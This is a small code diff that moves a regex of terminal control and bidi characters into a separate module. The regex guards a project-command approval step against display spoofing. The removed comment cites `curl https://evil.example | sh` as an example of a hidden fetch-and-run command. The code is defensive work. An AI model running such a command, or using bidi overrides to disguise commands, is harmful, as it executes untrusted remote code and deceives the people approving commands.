@@ -29,6 +29,7 @@
  * approve and is never gated either.
  */
 import { createHash } from 'crypto';
+import { CONTROL_CHARACTERS } from './control-characters.js';
 import { extractShellInjections } from './commands/shell-injection.js';
 import type { CommandSettings, ProjectCommandChoice } from './settings.js';
 import type { SlashCommand } from './types/commands.js';
@@ -113,15 +114,6 @@ export class ProjectCommandApprovalError extends Error {
 
 const MAX_LISTED_COMMANDS = 5;
 const MAX_COMMAND_CHARS = 160;
-/**
- * Everything that can make rendered text differ from the text that runs:
- * C0 controls and DEL, the separators NEL/LS/PS, and the bidi marks,
- * embeddings, overrides and isolates. An override can display
- * `curl https://evil.example | sh` as something harmless while the approved
- * digest covers the real thing.
- */
-const CONTROL_CHARACTERS =
-  /[\u0000-\u001f\u007f\u0085\u061c\u200e\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069]+/g;
 
 /**
  * Render repository-authored text for a terminal.
